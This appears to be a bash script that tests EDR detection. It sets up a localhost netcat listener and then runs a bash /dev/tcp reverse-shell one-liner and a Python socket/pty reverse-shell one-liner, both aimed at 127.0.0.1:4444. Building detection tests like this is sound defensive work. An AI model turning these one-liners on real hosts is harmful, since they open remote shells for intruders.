#!/usr/bin/env bash
# ==============================================================================
# Simulation: Harmless Localhost Reverse Shell Trigger
# ==============================================================================
# Emulates an interactive reverse shell invocation connecting to localhost (127.0.0.1:4444).
# This generates the exact sys_enter_execve / sys_enter_connect telemetry patterns
# monitored by the EDR agent without exposing network ports externally.
# ==============================================================================

set -u

echo "[*] Triggering harmless reverse shell simulation..."

# 1. Start a temporary background listener on localhost port 4444 (if nc available)
if command -v nc >/dev/null 2>&1; then
    nc -l -p 4444 >/dev/null 2>&1 &
    LISTENER_PID=$!
    sleep 0.5
else
    LISTENER_PID=""
fi

# 2. Emulate bash reverse shell syntax
echo "[*] Executing interactive bash reverse shell pattern (/dev/tcp redirection)..."
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1 || true

# 3. Emulate python socket one-liner pattern
echo "[*] Executing python reverse shell pattern..."
python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect_ex(("127.0.0.1",4444)); pty.spawn("/bin/sh")' >/dev/null 2>&1 || true

# Cleanup listener
if [ -n "$LISTENER_PID" ]; then
    kill "$LISTENER_PID" >/dev/null 2>&1 || true
fi

echo "[+] Reverse shell simulation executed successfully."
